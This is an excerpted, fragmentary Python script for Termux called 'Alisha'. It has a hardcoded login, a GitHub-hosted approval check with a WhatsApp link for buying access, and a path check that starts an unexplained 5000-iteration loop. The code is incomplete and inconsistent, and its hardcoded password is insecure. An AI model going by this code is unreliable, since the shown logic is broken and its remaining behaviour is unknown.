...
while attemps < 12345677901:
    ...
    if username == 'Alisha' and password == '123':
...
logo= f'''
 ...
 .d8b.  db      d888888b .d8888. db   db  .d8b.  
d8' `8b 88        `88'   88'  YP 88   88 d8' `8b 
88ooo88 88         88    `8bo.   88ooo88 88ooo88 
88~~~88 88         88      `Y8b. 88~~~88 88~~~88 
88   88 88booo.   .88.   db   8D 88   88 88   88 
YP   YP Y88888P Y888888P `8888Y' YP   YP YP   YP
...
def qsbuy():
        try:
                os.system('clear')
                print(logo)
                x = requests.get('https://github.com/ChuzziDoll/Alisha001/blob/main/Aproval.txt').text
                if str("upppdate") in update:
                        ...
                        os.system(f"termux-open-url https://wa.me/+923253343928?text={bumper}")
                        qsbuy()
...
datar = []
datar.append(pat)
if '/data/data/com.termux/files/home/ALISHA' in datar:
        pass
else:
        for i in range(5000):
